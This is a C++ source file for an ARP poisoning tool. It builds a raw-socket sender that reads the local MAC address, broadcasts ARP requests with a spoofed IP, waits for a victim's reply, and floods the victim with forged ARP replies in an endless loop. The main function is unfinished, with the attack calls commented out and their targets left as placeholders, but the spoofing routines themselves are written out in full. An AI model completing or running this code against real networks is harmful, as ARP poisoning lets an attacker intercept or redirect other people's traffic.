#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <cstring>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <unistd.h>

#include "ip_address.h"
#include "mac_address.h"
#include "arp_packet.h"
#include "ethernet_frame.h"
#include "debug.h"
#include "io.h"

#define SPOOFED_SEND_DELAY 1

#define GUARD(x, err) if(!(x)) {    \
    printf("[x] ERROR: " err "\n"); \
    exit(EXIT_FAILURE);             \
}                                   \

MACAddress get_hardware_address(int fd, const char* if_name){
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, if_name, IFNAMSIZ-1);

    GUARD(ioctl(fd, SIOCGIFHWADDR, &ifr) >= 0, "failed to get mac address");
    
    unsigned char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    MACAddress address;

    for(int i = 0; i < MAC_ADDRESS_LEN; ++i){
        address.octets[i] = mac[i];
    }

    return address;    
}

void broadcast_packet(
    int fd, struct sockaddr* device, 
    const MACAddress& src_mac_addr, const IPv4Address& spoofed_ip_addr, const IPv4Address& dst_ip_addr
){
    static MACAddress broadcast_mac_addr = MACAddress::get_broadcast_addr();
    ARPPacket arp = ARPPacket(ARP_REQUEST, src_mac_addr, spoofed_ip_addr, broadcast_mac_addr, dst_ip_addr);
    EthernetFrame eth = EthernetFrame(src_mac_addr, broadcast_mac_addr, ETHTYPE_ARP);
    
    static uint8_t buffer[1500];
    write(buffer, eth, arp);

    int bytes_send = sendto(fd, buffer, ETH_HEADER_LEN + ARP_PACKET_LEN, 0, device, sizeof(*device));
    GUARD(bytes_send > 0, "failed to broadcast packet");
}

MACAddress get_victim_response(int fd, struct sockaddr* device, const IPv4Address& victim_ip_addr){
    static uint8_t buffer[1500];

    EthernetFrame   eth;
    ARPPacket       arp;

    while(true) {
        int bytes_read = recvfrom(fd, buffer, 1500, 0, NULL, NULL);
        GUARD(bytes_read > 0, "failed to read from socket");
        read(buffer, eth, arp);

        if(arp.opcode == ARP_REPLY && arp.src_ip_addr == victim_ip_addr){
            return arp.src_mac_addr;
        }
    }
}

void send_to_victim(
    int fd, struct sockaddr* device, int repeat_delay,
    MACAddress src_mac_addr, IPv4Address spoofed_ip_addr, 
    MACAddress victim_mac_addr, IPv4Address victim_ip_addr
){
    ARPPacket arp = ARPPacket(ARP_REPLY, src_mac_addr, spoofed_ip_addr, victim_mac_addr, victim_ip_addr);
    EthernetFrame eth = EthernetFrame(src_mac_addr, victim_mac_addr, ETHTYPE_ARP);

    static uint8_t buffer[1500];  
    write(buffer, eth, arp);

    while(true){
        int bytes_send = sendto(fd, buffer, ETH_HEADER_LEN + ARP_PACKET_LEN, 0, device, sizeof(*device));
        GUARD(bytes_send > 0, "failed to send data on socket");
        sleep(repeat_delay);
    }



}

void get_index_from_interface(struct sockaddr_ll* device, const char* ifname){
    device->sll_ifindex = if_nametoindex(ifname);
    if(device->sll_ifindex){
        printf("[+] Got index: %d\n", device->sll_ifindex);
    }
    else{
        printf("[-] Error: Couldn't get index from ifname\n");
    }
}

int main(int argc, char** argv){
    if(argc < 4){
        // TODO: Show usage info
        printf("Expected 3 arguments got %d", argc);
        return 0;
    }

    auto ip1 = IPv4Address::from_str(argv[1]);
    auto ip2 = IPv4Address::from_str(argv[2]);
    auto interface = argv[3];
    printf("Interface: %s\n", interface);

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    GUARD(fd != -1, "failed to create socket");

    MACAddress src_mac_addr = get_hardware_address(fd, interface);
    print(src_mac_addr);

    struct sockaddr_ll device;
    get_index_from_interface(&device, interface);

    printf("Starting ARP Poisoning\n");

    // broadcast_packet(fd, &device, src_mac_addr, ??, ??)
    // MACAddress victim_mac_addr = get_victim_response(fd, device, ??);
    // send_to_victim(fd, &device, SPOOFED_SEND_DELAY, src_mac_addr, ??, victim_mac_addr, ??);
    // close(fd);
    return 0;
}